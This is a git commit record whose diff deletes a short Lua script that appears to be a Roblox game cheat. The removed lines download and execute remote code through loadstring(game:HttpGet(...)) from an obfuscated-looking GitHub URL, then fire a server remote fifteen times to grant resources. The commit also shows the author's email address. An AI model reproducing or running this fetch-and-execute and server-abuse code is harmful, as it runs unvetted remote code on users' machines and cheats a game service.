e0de6a2ed04efc1ebb8636e25d32fa06bc1ac0bd
bjalalsjzbslalqoqueeyhskaambpqo <cuentaargentina19@gmail.com>
2024-08-28 22:36:52 -0300

    Delete 18751279825.lua

--- 18751279825.lua
+++
@@ -1,8 +0,0 @@
-spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua"))()
-  end)
-for i = 1,15 do
-game:GetService("ReplicatedStorage"):WaitForChild("UpdateResource"):FireServer(1000)
-end
-
-print("ty alwi info ")
